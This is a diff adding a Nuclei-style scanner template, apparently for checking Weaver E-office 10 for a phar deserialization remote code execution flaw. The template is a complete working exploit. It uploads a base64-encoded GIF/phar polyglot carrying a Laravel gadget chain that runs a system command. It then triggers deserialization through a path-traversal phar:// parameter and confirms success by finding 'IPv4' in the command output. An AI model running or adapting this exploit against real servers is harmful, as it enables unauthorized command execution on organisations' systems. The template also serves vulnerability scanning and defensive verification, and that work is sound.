@@ -1,0 +1,69 @@
+id: weaver-eoffice-v10-attachment-atuhfile-rce
+
+info:
+  name: 泛微 E-office tuh-file - rce
+  author: leadlife
+  severity: critical
+  description: 泛微E-office 10 atuh-file存在phar反序列化漏洞
+  metadata:
+    verified: true
+    fofa-qeury:
+  tags: weaver,rce,oa,eoffice
+
+variables:
+  file: "R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQomAQAAAQAAABEAAAABAAAAAADwAAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6ODoiaXBjb25maWciO319CAAAAHRlc3QudHh0BAAAAK4EDGYEAAAADH5/2LYBAAAAAAAAdGVzdGCDRQ1G9gG3bXmo1wFM4TXzF8m9NZSuW5egN8A9V50JAwAAAEdCTUI="
+
+http:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: multipart/form-data; boundary=00sldjfpe0luoipeiq00
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 517
+        Connection: close
+
+        --00sldjfpe0luoipeiq00
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+
+        {{base64_decode("{{file}}")}}
+        --00sldjfpe0luoipeiq00--
+
+      - |
+        POST /eoffice10/server/public/api/attachment/path/migrate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+        Content-Length: 69
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        source_path=&desc_path=phar%3A%2F%2F..%2F..%2F..%2F..%2Fattachment%2F
+
+      - |
+        POST /eoffice10/server/public/api/empower/import HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+        Content-Length: 47
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        type=tttt&file={{id}}
+
+    extractors:
+      - type: regex
+        name: id
+        group: 1
+        regex: 
+         - "\"attachment_id\":\"(.*?)\""
+        internal: true
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_3==200 && contains_all(body_3,"IPv4")'
+
+
